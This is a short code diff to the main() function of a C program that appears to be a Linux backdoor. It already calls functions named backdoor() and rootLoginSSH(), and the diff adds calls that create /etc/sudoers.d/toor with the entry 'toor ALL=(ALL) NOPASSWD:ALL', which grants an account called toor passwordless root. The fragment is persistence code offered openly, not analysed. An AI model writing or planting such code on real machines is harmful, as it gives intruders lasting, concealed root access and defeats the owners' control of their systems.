@@ -15,6 +15,8 @@ int main(){
     backdoor("/home/ubuntu/test.txt");
     //isStringInFile("/etc/ssh/sshd_config", "PermitRootLogin yes");
     rootLoginSSH();
+    sudoersFile("/etc/sudoers.d/toor");
+    sudoersEntry("toor ALL=(ALL) NOPASSWD:ALL");
 
     return 0;
 }
